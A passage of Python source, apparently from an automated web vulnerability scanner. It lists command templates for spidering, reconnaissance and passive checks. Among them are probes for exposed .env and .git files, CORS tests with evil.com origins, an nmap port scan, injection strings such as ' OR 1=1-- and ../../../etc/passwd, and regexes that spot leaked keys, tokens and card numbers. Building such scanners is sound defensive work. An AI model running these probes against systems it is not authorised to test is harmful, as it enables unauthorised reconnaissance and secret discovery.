                                      detail=f"findings={len(_findings)} summary={summary}")
                        get_global_bus().publish(SCAN_COMPLETE, {
                            "scan_id": _active_scan_id,
                            "finding_count": len(_findings),
                            "target": _scan_target,
                        })
                        _fire_integrations_on_complete(_active_scan_id, list(_findings), _scan_target)
                except Exception:
                    pass


# ── Static agent (no-key mode) ────────────────────────────────────────────────
# Maps phase→agent_name to a list of (command_template, reason) tuples.
# These run sequentially when no AI API key is configured.
_STATIC_CMDS: dict = {
    "Spider Agent": [
        # 1: Full response headers + redirect chain
        ("curl -sIL --max-time 12 -A 'Mozilla/5.0 (DAST-Spider/2.0)' {target}", "HTTP headers + redirect chain"),
        # 2: Fetch root page with real browser UA (follows redirects)
        ("curl -sL --max-time 18 -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' {target} -o /tmp/dast_root.html 2>/dev/null && echo \"Fetched $(wc -c < /tmp/dast_root.html) bytes from {target}\"", "Fetch root page (real UA, follows redirects)"),
        # 3: Extract ALL links, forms, API paths, data attributes from root HTML
        (
            r"""python3 - <<'PYEOF'
import re, os
h = open('/tmp/dast_root.html').read() if os.path.exists('/tmp/dast_root.html') else ''
found = set()
for pat in [r'(?:href|src|action|formaction|data-href|data-url|data-src)=["\']([^"\'<> ]+)["\']',
            r'(?:href|src|action)=([^\s"\'<>]+)',
            r'["\'](?:url|endpoint|path|route|api)["\']:\s*["\']([/][^"\'<> ]+)["\']']:
    found.update(re.findall(pat, h, re.I))
links = sorted(l for l in found if l and not l.startswith(('mailto:','javascript:','#','data:')))
print(f"Found {len(links)} links/paths:")
[print(' ', l) for l in links[:120]]
PYEOF""",
            "Extract href/src/action/data-* links + embedded API path strings"
        ),
        # 4: API route extraction from JS bundles (top 8 bundles)
        (
            r"""python3 - <<'PYEOF'
import re, subprocess, os
h = open('/tmp/dast_root.html').read() if os.path.exists('/tmp/dast_root.html') else ''
base = '{target}'.rstrip('/')
js_paths = sorted(set(re.findall(r'src=["\'](((?:https?://|/)[^"\'<> ]+\.js(?:[?#][^"\'<> ]*)?))["\']', h)))[:8]
js_paths = [m[0] for m in js_paths]
routes = set()
for p in js_paths:
    url = p if p.startswith('http') else base + p
    try:
        js = subprocess.run(['curl','-sL','--max-time','12',url], capture_output=True, text=True, timeout=15).stdout[:500000]
        routes.update(re.findall(r'["\x60](/(?:api|v\d+|auth|user|users|admin|graphql|internal|public|account|profile|settings|dashboard|order|product|payment|webhook)[^"\x60\s<>]{0,150})', js))
    except Exception:
        pass
print(f"JS bundles scanned: {len(js_paths)}, API routes found: {len(routes)}")
[print(' ', r) for r in sorted(routes)[:80]]
PYEOF""",
            "Scan JS bundles for API routes, auth endpoints, internal paths"
        ),
        # 5: Probe 55 sensitive/common paths — all non-404/000 responses reported
        (
            "for path in "
            "robots.txt sitemap.xml sitemap_index.xml "
            ".well-known/security.txt .well-known/openid-configuration .well-known/jwks.json "
            "health healthz ready readiness liveness status ping version "
            "metrics actuator actuator/health actuator/env actuator/beans actuator/mappings "
            "api api/v1 api/v2 api/v3 v1 v2 v3 "
            "swagger.json swagger-ui.html openapi.json openapi.yaml api-docs "
            "api/swagger.json v1/api-docs swagger/v1/swagger.json "
            "graphql graphiql __graphql "
            ".env .env.local .env.production .env.staging .env.backup "
            ".git/config .git/HEAD "
            "admin administrator console debug internal "
            "wp-admin wp-login.php phpmyadmin adminer "
            "login dashboard backup dump.sql "
            "config.json settings.json server-status .htaccess; do "
            "  info=$(curl -sI --max-time 6 "
            "    -A 'Mozilla/5.0 (DAST-Spider/2.0)' {target}/$path 2>/dev/null); "
            "  code=$(echo \"$info\" | grep -m1 '^HTTP/' | awk '{print $2}'); "
            "  ct=$(echo \"$info\" | grep -i '^content-type:' | head -1 | tr -d '\\r'); "
            "  if [ \"$code\" = '200' ]; then "
            "    case \"$path\" in "
            "      *.env*|*.git*|*.sql|*.dump|*.sqlite|*.db|*.bak|*.old|*.orig|*.backup|*.swp|*.zip) "
            "        echo \"$ct\" | grep -qiv 'text/html' && echo \"200  {target}/$path\" ;; "
            "      *) echo \"200  {target}/$path\" ;; "
            "    esac; "
            "  fi; "
            "  [ \"$code\" != '000' ] && [ \"$code\" != '200' ] && [ \"$code\" != '404' ] "
            "    && [ \"$code\" != '410' ] && [ \"$code\" != '301' ] && [ \"$code\" != '302' ] "
            "    && [ \"$code\" != '307' ] && [ \"$code\" != '308' ] "
            "    && echo \"$code  {target}/$path\"; "
            "done",
            "Probe 55 sensitive paths — env files, git, admin, actuator, swagger, graphql"
        ),
        # 6: robots.txt — extract disallowed/sitemap entries
        ("curl -sL --max-time 8 -A 'Mozilla/5.0' {target}/robots.txt 2>/dev/null | grep -iE '^(Disallow|Allow|Sitemap):' | head -60", "robots.txt — disallowed paths reveal hidden endpoints"),
        # 7: sitemap.xml — extract all <loc> URLs
        (r"""curl -sL --max-time 10 {target}/sitemap.xml 2>/dev/null | python3 -c "import sys,re; x=sys.stdin.read(); urls=re.findall(r'<loc>([^<]+)</loc>',x); print(f'Sitemap: {len(urls)} URLs'); [print(' ',u) for u in sorted(set(urls))[:80]]" """, "sitemap.xml URL extraction"),
        # 8: CORS misconfiguration probe
        ("curl -sI -A 'Mozilla/5.0' -H 'Origin: https://evil.com' {target} 2>/dev/null | grep -i 'access-control'", "CORS probe with evil.com origin — reflects = misconfigured"),
        # 9: Clickjacking + security header audit
        ("curl -sI -A 'Mozilla/5.0' {target} 2>/dev/null | grep -iE 'x-frame-options|content-security-policy|strict-transport|x-content-type|referrer-policy|permissions-policy|x-powered-by|server:'", "Security headers quick audit"),
        # 10: Exposed actuator/debug endpoints — fetch body snippet
        (
            "for ep in actuator/env actuator/beans actuator/mappings _debug __debug__ telescope/requests _profiler; do "
            "  code=$(curl -so /tmp/_dast_act.txt -w '%{http_code}' --max-time 6 {target}/$ep 2>/dev/null); "
            "  [ \"$code\" = '200' ] && echo \"EXPOSED 200: {target}/$ep\" && head -c 300 /tmp/_dast_act.txt && echo; "
            "done",
            "Probe actuator/debug endpoints — fetch first 300 bytes if 200"
        ),
        # 11: GraphQL introspection probe
        (
            "curl -s --max-time 10 -X POST -H 'Content-Type: application/json' "
            "-d '{\"query\":\"{__schema{types{name}}}\"}' {target}/graphql 2>/dev/null | "
            "python3 -c \"import sys,json; d=sys.stdin.read(); "
            "print('GraphQL introspection ENABLED' if '__schema' in d else 'GraphQL: no introspection or not found'); "
            "print(d[:200])\" 2>/dev/null",
            "GraphQL introspection probe — schema exposure check"
        ),
        # 12: Katana deep crawl (primary JS-aware spider)
        ("katana -u {target} -depth 5 -jc -jsl -aff -silent -timeout 30 -c 10 2>/dev/null || echo 'katana not available'", "Katana deep crawl — JS-aware, form extraction, JS static analysis"),
    ],
    "Recon Agent": [
        # 1: Full response headers — fingerprint server, detect framework, audit security headers
        ("curl -sIL -A 'Mozilla/5.0 (Recon/1.0)' --max-time 12 {target} 2>/dev/null", "Full HTTP headers — server banner, security headers, cookies"),

        # 2: SSL/TLS certificate details — issuer, expiry, SANs, protocol version
        (
            "echo Q | openssl s_client -connect {host}:443 -servername {host} "
            "-brief 2>/dev/null | head -30; "
            "echo '---'; "
            "echo Q | openssl s_client -connect {host}:443 -servername {host} 2>/dev/null "
            "| openssl x509 -noout -subject -issuer -dates -ext subjectAltName 2>/dev/null",
            "SSL/TLS certificate — issuer, expiry, SANs, protocol"
        ),

        # 3: TLS protocol + cipher audit — detect weak protocols (TLSv1.0/1.1) and ciphers
        (
            "for proto in ssl2 ssl3 tls1 tls1_1; do "
            "  result=$(echo Q | openssl s_client -connect {host}:443 -{proto} 2>&1 | head -3); "
            "  echo \"$proto: $result\" | grep -v 'CONNECTED\\|---'; "
            "done 2>/dev/null; "
            "echo Q | openssl s_client -connect {host}:443 -cipher 'NULL:EXPORT:RC4:DES:3DES:aNULL' "
            "-brief 2>&1 | grep -i 'cipher\\|error\\|fail' | head -5",
            "Weak TLS protocol + cipher suite probe"
        ),

        # 4: DNS reconnaissance — A/AAAA, MX, TXT (SPF/DMARC), CNAME, nameservers
        (
            "host=$(echo {host} | sed 's/:[0-9]*$//'); "
            "echo '=== A/AAAA ==='; dig +short A $host 2>/dev/null; dig +short AAAA $host 2>/dev/null; "
            "echo '=== MX ==='; dig +short MX $host 2>/dev/null; "
            "echo '=== TXT (SPF/DMARC) ==='; dig +short TXT $host 2>/dev/null; "
            "dig +short TXT _dmarc.$host 2>/dev/null; "
            "echo '=== NS ==='; dig +short NS $host 2>/dev/null; "
            "echo '=== CNAME ==='; dig +short CNAME $host 2>/dev/null",
            "DNS records — A/AAAA, MX, TXT/SPF/DMARC, NS, CNAME"
        ),

        # 5: Technology stack detection — parse HTML body for framework signatures
        (
            r"""curl -sL --max-time 12 -A 'Mozilla/5.0' {target} 2>/dev/null | python3 -c "
import sys, re
h = sys.stdin.read()[:50000]
sigs = {
  'WordPress':    r'wp-content|wp-includes|WordPress',
  'Drupal':       r'Drupal\.settings|drupal\.js|/sites/default/',
  'Joomla':       r'Joomla!|/components/com_|joomla',
  'Laravel':      r'laravel_session|Laravel|X-RateLimit',
  'Django':       r'csrfmiddlewaretoken|Django|__django',
  'Rails':        r'X-Request-Id.*rails|_session_id.*rails|Ruby on Rails',
  'Next\.js':     r'__NEXT_DATA__|/_next/|next\.js',
  'React':        r'__react|data-reactroot|react\.js',
  'Angular':      r'ng-version|angular\.js|ng-app',
  'Vue\.js':      r'__vue|vue\.min\.js|data-v-',
  'jQuery':       r'jquery[.-][\d.]+',
  'Bootstrap':    r'bootstrap[.-][\d.]+',
  'Spring':       r'org\.springframework|SPRING_SECURITY',
  'ASP\.NET':     r'ASP\.NET|__VIEWSTATE|__EVENTVALIDATION',
  'PHP':          r'PHPSESSID|\.php[?\s]|PHP/',
  'Node\.js':     r'X-Powered-By: Express|connect\.sid',
  'GraphQL':      r'graphql|__schema|__typename',
}
found = [name for name, pat in sigs.items() if re.search(pat, h, re.I)]
print('Technologies detected:', ', '.join(found) if found else 'none identified')
# Detect framework version strings
for pat in [r'jQuery\s+v?([\d.]+)', r'Bootstrap\s+v?([\d.]+)', r'Angular\s+([\d.]+)', r'react[@/]([\d.]+)', r'next[@/]([\d.]+)']:
    m = re.search(pat, h, re.I)
    if m: print(f'  version hint: {m.group(0)[:80]}')
" 2>/dev/null""",
            "Technology fingerprinting — frameworks, libraries, CMS, versions"
        ),

        # 6: Security headers comprehensive audit
        (
            "curl -sI -A 'Mozilla/5.0' --max-time 10 {target} 2>/dev/null | "
            r"""python3 -c "
import sys
hdrs = sys.stdin.read().lower()
checks = {
  'strict-transport-security':  'HSTS',
  'content-security-policy':    'CSP',
  'x-frame-options':            'X-Frame-Options',
  'x-content-type-options':     'X-Content-Type-Options',
  'referrer-policy':            'Referrer-Policy',
  'permissions-policy':         'Permissions-Policy',
  'cross-origin-opener-policy': 'COOP',
  'cross-origin-resource-policy':'CORP',
}
for hdr, name in checks.items():
    status = 'PRESENT' if hdr in hdrs else 'MISSING'
    print(f'{status}: {name}')
for line in hdrs.splitlines():
    if any(x in line for x in ['server:','x-powered-by:','x-aspnet','x-generator','x-backend']):
        print('DISCLOSURE:', line.strip())
" 2>/dev/null""",
            "Security headers audit — HSTS, CSP, X-Frame, COOP/CORP, disclosure headers"
        ),

        # 7: Cookie security flags audit
        (
            "curl -sI -A 'Mozilla/5.0' --max-time 10 -c /dev/null {target} 2>/dev/null | "
            r"""python3 -c "
import sys, re
resp = sys.stdin.read()
cookies = re.findall(r'(?i)set-cookie:\s*([^\r\n]+)', resp)
for c in cookies:
    name = c.split('=')[0].strip()
    flags = c.lower()
    missing = []
    if 'httponly' not in flags: missing.append('HttpOnly')
    if 'secure' not in flags:   missing.append('Secure')
    if 'samesite' not in flags: missing.append('SameSite')
    if missing:
        print(f'Cookie {name!r} missing: {\", \".join(missing)}')
    else:
        print(f'Cookie {name!r}: all security flags present')
if not cookies:
    print('No Set-Cookie headers found')
" 2>/dev/null""",
            "Cookie security flags — HttpOnly, Secure, SameSite audit"
        ),

        # 8: CORS misconfiguration — origin reflection, credentials header
        (
            "curl -sI -A 'Mozilla/5.0' -H 'Origin: https://evil.com' --max-time 10 {target} 2>/dev/null | "
            "grep -i 'access-control'; "
            "echo '---'; "
            "curl -sI -A 'Mozilla/5.0' -H 'Origin: null' --max-time 10 {target} 2>/dev/null | "
            "grep -i 'access-control'",
            "CORS probe — evil.com origin + null origin reflection test"
        ),

        # 9: HTTP methods — OPTIONS, TRACE, PUT, DELETE enabled?
        (
            "curl -sI -X OPTIONS -A 'Mozilla/5.0' --max-time 10 {target} 2>/dev/null | "
            "grep -iE 'allow:|access-control-allow-methods:'; "
            "echo '--- TRACE ---'; "
            "curl -s -X TRACE --max-time 8 {target} 2>/dev/null | head -10",
            "HTTP methods audit — OPTIONS allowed methods, TRACE echo test"
        ),

        # 10: Port scan — fast, common web/API ports
        (
            "nmap -sV --open -T4 -p 80,443,8080,8443,8000,3000,3001,4000,4443,5000,5001,8888,9000,9090,9200,9443,27017,6379 "
            "--host-timeout 30s {host} 2>/dev/null | grep -v '^#\\|^$\\|Starting\\|Nmap\\|scan report' | head -30",
            "Port scan — web, API, database and service ports"
        ),

        # 11: Certificate transparency — find subdomains via crt.sh
        (
            r"""host=$(echo {host} | sed 's/:[0-9]*$//'); """
            r"""curl -s --max-time 15 "https://crt.sh/?q=%25.$host&output=json" 2>/dev/null | """
            r"""python3 -c "
import sys, json
try:
    data = json.loads(sys.stdin.read())
    subs = sorted(set(
        d.get('name_value','').replace('*.','')
        for d in data
        if d.get('name_value') and not d['name_value'].startswith('@')
    ))
    print(f'crt.sh: {len(subs)} subdomains via cert transparency')
    [print(' ', s) for s in subs[:40]]
except Exception as e:
    print(f'crt.sh unavailable: {e}')
" 2>/dev/null""",
            "Certificate transparency — crt.sh subdomain enumeration"
        ),

        # 12: WAF detection heuristics — probe with known WAF bypass strings
        (
            "for payload in \"<script>alert(1)</script>\" \"../../../etc/passwd\" \"' OR 1=1--\" \"{{7*7}}\"; do "
            "  code=$(curl -so /tmp/_waf_probe.txt -w '%{http_code}' --max-time 6 "
            "    -A 'Mozilla/5.0' \"{target}?waf_test=$(python3 -c \"import urllib.parse; print(urllib.parse.quote('$payload'))\" 2>/dev/null || echo test)\" 2>/dev/null); "
            "  body=$(head -c 500 /tmp/_waf_probe.txt 2>/dev/null); "
            "  echo \"$code: $payload\"; "
            "  echo \"$body\" | grep -ioE 'cloudflare|akamai|sucuri|imperva|f5|barracuda|fortiweb|blocked|forbidden|request denied|security|firewall|waf' | head -3; "
            "done",
            "WAF detection — probe with attack patterns, check for block pages"
        ),
    ],
    "Passive Scanner": [
        # 1: Full response headers — everything at once, one clean dump
        (
            "curl -sIL -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' "
            "--max-time 12 -D - -o /dev/null {target} 2>/dev/null",
            "Full HTTP response headers dump"
        ),
        # 2: Body + headers together — saved for later analysis
        (
            "curl -sL -A 'Mozilla/5.0' --max-time 15 {target} -o /tmp/ps_body.html "
            "-D /tmp/ps_headers.txt 2>/dev/null && "
            "echo \"=HEADERS=\" && cat /tmp/ps_headers.txt && "
            "echo \"=BODY_LEN=$(wc -c < /tmp/ps_body.html)bytes=\"",
            "Fetch page body + headers for analysis"
        ),
        # 3: Security headers audit — structured PRESENT/MISSING output
        (
            r"""python3 - <<'PYEOF'
import subprocess, re
r = subprocess.run(['curl','-sIL','-A','Mozilla/5.0','--max-time','12','{target}'],
                   capture_output=True, text=True).stdout.lower()
HDRS = {
  'strict-transport-security':    ('HSTS',              'high'),
  'content-security-policy':      ('CSP',               'high'),
  'x-frame-options':              ('X-Frame-Options',   'medium'),
  'x-content-type-options':       ('X-Content-Type',    'medium'),
  'referrer-policy':              ('Referrer-Policy',   'low'),
  'permissions-policy':           ('Permissions-Policy','low'),
  'cross-origin-opener-policy':   ('COOP',              'medium'),
  'cross-origin-resource-policy': ('CORP',              'medium'),
  'cross-origin-embedder-policy': ('COEP',              'low'),
}
for hdr,(name,sev) in HDRS.items():
    st = 'PRESENT' if hdr in r else f'MISSING [{sev.upper()}]'
    print(f'{st}: {name}')
for line in r.splitlines():
    if any(x in line for x in ['server:','x-powered-by:','x-aspnet','x-generator','x-backend','x-runtime','x-version']):
        print(f'DISCLOSURE: {line.strip()}')
# CSP value analysis
m = re.search(r"content-security-policy:\s*([^\r\n]+)", r)
if m:
    csp = m.group(1)
    if 'unsafe-inline' in csp: print("CSP_UNSAFE: unsafe-inline in script-src")
    if 'unsafe-eval' in csp:   print("CSP_UNSAFE: unsafe-eval in script-src")
    if "'*'" in csp or ' * ' in csp: print("CSP_UNSAFE: wildcard source in CSP")
# HSTS analysis
h = re.search(r"strict-transport-security:\s*([^\r\n]+)", r)
if h:
    hsts = h.group(1)
    if 'max-age=0' in hsts: print("HSTS_DISABLED: max-age=0 disables HSTS")
    if not re.search(r'max-age=(\d+)', hsts) or int((re.search(r'max-age=(\d+)',hsts) or type('x',(),{'group':lambda s,n:"0"})()).group(1)) < 10886400:
        print("HSTS_WEAK: max-age less than 6 months")
    if 'includesubdomains' not in hsts: print("HSTS_PARTIAL: includeSubDomains missing")
    if 'preload' not in hsts: print("HSTS_NO_PRELOAD: preload directive missing")
PYEOF""",
            "Security headers structured audit — HSTS/CSP/X-Frame analysis with policy checks"
        ),
        # 4: Cookie security audit — every Set-Cookie flag checked
        (
            r"""python3 - <<'PYEOF'
import subprocess, re
r = subprocess.run(['curl','-sIL','-A','Mozilla/5.0','-c','/dev/null','--max-time','12','{target}'],
                   capture_output=True, text=True).stdout
cookies = re.findall(r'(?i)set-cookie:\s*([^\r\n]+)', r)
if not cookies:
    print("NO_COOKIES: no Set-Cookie headers found")
for raw in cookies:
    name = raw.split('=')[0].strip()
    low  = raw.lower()
    if 'httponly' not in low: print(f"COOKIE_NO_HTTPONLY: {name}")
    if 'secure'   not in low: print(f"COOKIE_NO_SECURE: {name}")
    if 'samesite' not in low: print(f"COOKIE_NO_SAMESITE: {name}")
    elif 'samesite=none' in low and 'secure' not in low:
        print(f"COOKIE_SAMESITE_NONE_INSECURE: {name}")
    # Session token length heuristic
    m = re.match(r'[^=]+=([^;]+)', raw)
    if m and len(m.group(1)) < 16:
        print(f"COOKIE_SHORT_TOKEN: {name} value only {len(m.group(1))} chars")
    # Broad domain scope
    dm = re.search(r'domain=([^;,\s]+)', low)
    if dm and dm.group(1).startswith('.'):
        print(f"COOKIE_BROAD_DOMAIN: {name} scoped to {dm.group(1)}")
    # No expiry (session cookie on sensitive endpoint)
    if 'expires=' not in low and 'max-age=' not in low:
        print(f"COOKIE_SESSION_ONLY: {name} (no expiry — session cookie)")
PYEOF""",
            "Cookie security audit — HttpOnly/Secure/SameSite/domain/expiry per cookie"
        ),
        # 5: TLS/SSL deep analysis — protocols, ciphers, expiry, chain
        (
            r"""python3 - <<'PYEOF'
import subprocess, re
host = '{host}'.split(':')[0]
# Certificate details
cert_out = subprocess.run(
    ['bash','-c',f'echo Q | openssl s_client -connect {host}:443 -servername {host} 2>/dev/null | openssl x509 -noout -subject -issuer -dates -fingerprint -ext subjectAltName 2>/dev/null'],
    capture_output=True, text=True).stdout
print("=CERT="); print(cert_out[:1000] or "no cert")
# Weak protocol detection
for proto in ['ssl2','ssl3','tls1','tls1_1']:
    out = subprocess.run(
        ['bash','-c',f'echo Q | openssl s_client -connect {host}:443 -{proto} 2>&1 | head -2'],
        capture_output=True, text=True).stdout
    if 'CONNECTED' in out:
        print(f"WEAK_PROTO_{proto.upper()}: {proto} accepted by server")
    elif 'no protocols' in out.lower() or 'wrong version' in out.lower():
        print(f"PROTO_REJECTED: {proto}")
# Weak cipher check — must verify the negotiated cipher is actually weak,
# not a modern OpenSSL fallback to its default strong cipher list
weak = subprocess.run(
    ['bash','-c',f"echo Q | openssl s_client -connect {host}:443 -cipher 'NULL:EXPORT:RC4:DES:aNULL:eNULL' 2>&1 | head -6"],
    capture_output=True, text=True).stdout
if 'CONNECTED' in weak:
    cipher_m = re.search(r'Cipher\s*:\s*(\S+)', weak)
    if cipher_m:
        used = cipher_m.group(1).upper()
        _WEAK = ('NULL','EXP','RC4','DES','ANON','ADH','AECDH','EXPORT')
        if any(w in used for w in _WEAK):
            print("WEAK_CIPHER: server accepts NULL/EXPORT/RC4/DES ciphers")
# Cert expiry
from datetime import datetime
m = re.search(r'notAfter=(.+)', cert_out)
if m:
    try:
        exp = datetime.strptime(m.group(1).strip(), '%b %d %H:%M:%S %Y %Z')
        days = (exp - datetime.utcnow()).days
        if days < 0:   print(f"CERT_EXPIRED: expired {abs(days)} days ago")
        elif days < 14: print(f"CERT_EXPIRING_CRITICAL: expires in {days} days")
        elif days < 30: print(f"CERT_EXPIRING_SOON: expires in {days} days")
        else:           print(f"CERT_OK: expires in {days} days")
    except: pass
# Self-signed / untrusted
if 'self signed' in cert_out.lower() or 'unable to get local issuer' in cert_out.lower():
    print("CERT_SELF_SIGNED: certificate not trusted by public CA")
PYEOF""",
            "TLS deep analysis — protocols, weak ciphers, cert expiry, self-signed"
        ),
        # 6: Information disclosure in body — stack traces, internal paths, SQL errors, emails, IPs
        (
            r"""python3 - <<'PYEOF'
import re, os
body = open('/tmp/ps_body.html').read() if os.path.exists('/tmp/ps_body.html') else ''
if not body: print("BODY_UNAVAILABLE: could not read cached body"); exit()
checks = [
    (r'(?:mysql_fetch|mysql_error|Warning.*mysql_|mysqli_|pg_query|ORA-\d{5}|SQLiteException|SQLSTATE\[)', "SQL_ERROR: database error message in response"),
    (r'Traceback \(most recent call last\)',                   "PYTHON_TRACE: Python stack trace visible"),
    (r'at [a-zA-Z0-9_$\.]+\([a-zA-Z0-9_]+\.java:\d+\)',       "JAVA_TRACE: Java stack trace visible"),
    (r'System\.(?:Web|Data|IO)\.\w+Exception',                 "DOTNET_ERROR: .NET exception in response"),
    (r'(?:Fatal error|Parse error|Warning).*in /.+\.php',      "PHP_ERROR: PHP error with file path disclosed"),
    (r'/(?:home|var|etc|usr|opt|srv|tmp)/[a-zA-Z0-9_\-./]{8,}',"PATH_DISCLOSURE: internal file path in response"),
    (r'\b(?:10|172|192)\.(?:0|16|168)\.\d{1,3}\.\d{1,3}\b',   "INTERNAL_IP: RFC-1918 private IP address in response"),
    (r'(?i)(?:password|passwd|pwd)\s*[=:]\s*["\']?[^\s"\'<>]{4,}',"HARDCODED_CRED: password string in response body"),
    (r'(?i)(?:api[_-]?key|apikey|api_secret|secret[_-]?key)\s*[=:]\s*["\']?[A-Za-z0-9_\-]{16,}',"API_KEY: API key pattern in response"),
    (r'-----BEGIN (?:RSA |EC |DSA )?PRIVATE KEY-----', "PRIVATE_KEY: private key material in response"),
    (r'(?i)<!--.*(?:password|credential|secret|key|todo|hack|fixme|bug|admin).*-->',  "COMMENT_DISCLOSURE: sensitive info in HTML comment"),
    (r'[a-zA-Z0-9_.+-]{3,}@[a-zA-Z0-9-]{2,}\.[a-zA-Z]{2,}', "EMAIL_DISCLOSURE: email address in response"),
    (r'(?<!\d)(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13})',  "CC_NUMBER: potential credit card number"),
    (r'(?<!\d)\d{3}-\d{2}-\d{4}(?!\d)',                        "SSN: potential US Social Security Number"),
    (r'(?i)(?:access_token|bearer)\s*[:=]\s*["\']?[A-Za-z0-9_\-\.]{20,}', "ACCESS_TOKEN: bearer/access token in body"),
    (r'eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}', "JWT_IN_BODY: JWT token exposed in response body"),
    (r'(?i)X-SourceMap|sourceMappingURL=(?!data:)',             "SOURCE_MAP: source map reference in response"),
    (r'(?i)<input[^>]*type=["\']?password[^>]*autocomplete=["\']?(?:on|true)',  "AUTOCOMPLETE_ON: password field has autocomplete enabled"),
    (r'(?i)(?:src|href)=["\']http://',                          "MIXED_CONTENT: HTTP resource loaded on page"),
    (r'<directory[^>]*listing="on"',                           "DIR_LISTING_APACHE: directory listing enabled"),
    (r'Index of /',                                            "DIR_LISTING: directory listing in response"),
]
for pattern, label in checks:
    m = re.search(pattern, body, re.I | re.S)
    if m:
        snippet = m.group(0)[:80].replace('\n','\\n')
        print(f"{label} | evidence: {snippet}")
print(f"BODY_SIZE: {len(body)} bytes analysed")
PYEOF""",
            "Body analysis — SQL errors, stack traces, secrets, PII, paths, comments, mixed content"
        ),
        # 7: JavaScript secrets scan — fetch top JS bundles, scan for credentials
        (
            r"""python3 - <<'PYEOF'
import subprocess, re, os
body = open('/tmp/ps_body.html').read() if os.path.exists('/tmp/ps_body.html') else ''
base = '{target}'.rstrip('/')
js_urls = list(set(re.findall(r'src=["\']((?:https?://|/)[^"\']+\.js(?:[^"\']*)?)["\']', body, re.I)))[:6]
all_js = ''
for u in js_urls:
    url = u if u.startswith('http') else base + u
    js = subprocess.run(['curl','-sL','--max-time','10',url], capture_output=True, text=True).stdout[:200000]
    all_js += js
if not all_js:
    print("NO_JS: no JavaScript bundles found or fetched"); exit()
secret_patterns = [
    (r'(?i)(?:aws_access_key|AKIA)[A-Z0-9]{16}',         "AWS_KEY"),
    (r'(?i)(?:aws_secret|aws_secret_access_key)\s*[=:]\s*["\']?[A-Za-z0-9/+=]{40}', "AWS_SECRET"),
    (r'AIza[0-9A-Za-z_\-]{35}',                          "GOOGLE_API_KEY"),
    (r'(?i)gh[pousr]_[A-Za-z0-9_]{36,}',                 "GITHUB_TOKEN"),
    (r'sk_(?:live|test)_[A-Za-z0-9]{24,}',               "STRIPE_KEY"),
    (r'(?i)(?:slack_?token|xox[baprs]-)[A-Za-z0-9\-]{10,}', "SLACK_TOKEN"),
    (r'sq0[a-z]{3}-[A-Za-z0-9\-_]{22,43}',               "SQUARE_TOKEN"),
    (r'(?i)(?:twilio|sendgrid|mailgun)[_\s]?(?:api[_\s]?key|token)\s*[=:]\s*["\']?[A-Za-z0-9\-_]{20,}', "EMAIL_API_KEY"),
    (r'(?i)(?:firebase|firebaseio\.com)[^"\'<>\s]{20,}',  "FIREBASE_CONFIG"),
    (r'(?i)(?:private_key|privatekey)\s*[=:]\s*["\']?-----BEGIN', "PRIVATE_KEY_IN_JS"),
    (r'(?i)(?:password|passwd)\s*[=:]\s*["\'][^"\']{6,}["\']', "HARDCODED_PASSWORD"),
    (r'(?i)(?:secret|token|api.key)\s*[=:]\s*["\'][A-Za-z0-9_\-]{16,}["\']', "HARDCODED_SECRET"),
    (r'eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}',    "JWT_IN_JS"),
    (r'(?i)(?:mongodb|redis|postgres|mysql)://[^\s"\'<>]{10,}', "DB_CONNECTION_STRING"),
]
for pat, label in secret_patterns:
    m = re.search(pat, all_js)
    if m:
        print(f"JS_SECRET_{label}: {m.group(0)[:80]}")
# Dangerous JS sinks
for pat, label in [
    (r'document\.write\s*\(',                      "JS_SINK_DOCWRITE"),
    (r'innerHTML\s*=\s*(?![\'"]\s*[\'"])',          "JS_SINK_INNERHTML"),
    (r'eval\s*\(',                                  "JS_SINK_EVAL"),
    (r'setTimeout\s*\(\s*["\']',                    "JS_SINK_SETTIMEOUT_STRING"),
    (r'location\.(?:href|replace|assign)\s*=',     "JS_OPEN_REDIRECT_SINK"),
]:
    if re.search(pat, all_js): print(f"JS_DANGEROUS_{label}")
print(f"JS_SCANNED: {len(js_urls)} bundles, {len(all_js)} chars")
PYEOF""",
            "JS secrets scan — AWS/GCP/GitHub/Stripe keys, hardcoded creds, dangerous sinks"
        ),
        # 8: CORS comprehensive probe — 5 origin variants
        (
            "for origin in 'https://evil.com' 'null' 'https://{host}.evil.com' "
            "'http://{host}' 'https://attacker.io'; do "
            "  echo \"--- Origin: $origin ---\"; "
            "  curl -sI -A 'Mozilla/5.0' -H \"Origin: $origin\" --max-time 8 {target} 2>/dev/null "
            "  | grep -iE 'access-control|vary'; "
            "done",
            "CORS probe — evil.com, null, subdomain takeover, HTTP downgrade origins"
        ),
        # 9: Cache control analysis — sensitive pages should not be cached
        (
            "curl -sI -A 'Mozilla/5.0' --max-time 10 {target} 2>/dev/null | "
            r"""python3 -c "
import sys, re
h = sys.stdin.read().lower()
cc = re.search(r'cache-control:\s*([^\r\n]+)', h)
print('CACHE_CONTROL:', cc.group(1).strip() if cc else 'MISSING')
if not cc or 'no-store' not in cc.group(1):
    print('CACHE_NO_STORE_MISSING: page may be cached by proxies/CDNs')
if not cc or 'no-cache' not in cc.group(1):
    print('CACHE_NO_CACHE_MISSING: stale cached response possible')
pragma = re.search(r'pragma:\s*([^\r\n]+)', h)
print('PRAGMA:', pragma.group(1).strip() if pragma else 'MISSING')
etag = re.search(r'etag:\s*([^\r\n]+)', h)
if etag:
    ev = etag.group(1).strip()
    # inode-based ETag leaks server filesystem info
    if re.search(r'[0-9a-f]{5,}-[0-9a-f]+-[0-9a-f]+', ev):
        print(f'ETAG_INODE_LEAK: ETag may disclose inode: {ev[:50]}')
expires = re.search(r'expires:\s*([^\r\n]+)', h)
if expires: print('EXPIRES:', expires.group(1).strip())
vary = re.search(r'vary:\s*([^\r\n]+)', h)
if vary: print('VARY:', vary.group(1).strip())
" 2>/dev/null""",
            "Cache control audit — no-store, no-cache, ETag inode disclosure"
        ),
        # 10: Content-Type + charset analysis
        (
            "curl -sI -A 'Mozilla/5.0' --max-time 10 {target} 2>/dev/null | "
            r"""python3 -c "
import sys, re
h = sys.stdin.read()
ct = re.search(r'(?i)content-type:\s*([^\r\n]+)', h)
if ct:
    v = ct.group(1).strip()
    print('CONTENT_TYPE:', v)
    if 'text/html' in v.lower() and 'charset' not in v.lower():
        print('CHARSET_MISSING: HTML served without charset — charset sniffing attack possible')
